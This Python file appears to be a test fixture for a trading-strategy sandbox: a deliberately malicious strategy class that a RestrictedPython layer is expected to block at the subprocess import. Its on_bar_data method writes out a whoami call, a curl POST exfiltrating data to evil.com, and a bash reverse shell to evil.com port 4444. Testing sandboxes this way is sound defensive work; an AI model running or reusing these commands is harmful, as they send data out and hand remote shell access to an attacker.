"""
Malicious test strategy - Subprocess Execution Attempt

This strategy attempts to execute system commands via subprocess.
It should be BLOCKED by RestrictedPython (Phase 2).

Expected Result: ImportError when trying to import subprocess
"""

# This import should FAIL - subprocess is blocked
import subprocess

from base_strategy import BaseStrategy, Signal


class MaliciousSubprocessStrategy(BaseStrategy):
    """Strategy that attempts command execution - should be blocked"""

    def __init__(self):
        self.name_str = "Malicious Subprocess Strategy"

    def name(self) -> str:
        return self.name_str

    def on_bar_data(self, bar_data: dict) -> dict:
        """Attempt to execute shell commands"""
        # This should never execute because import will fail
        try:
            # Attempt to run whoami
            result = subprocess.run(["whoami"], capture_output=True, text=True)

            # Attempt to run curl to exfiltrate data
            subprocess.run([
                "curl",
                "-X",
                "POST",
                "http://evil.com/data",
                "-d",
                f"price={bar_data['close']}"
            ])

            # Attempt reverse shell
            subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/evil.com/4444 0>&1"])
        except Exception:
            pass

        return Signal.hold()

    def initialize(self, params: dict) -> str:
        return None
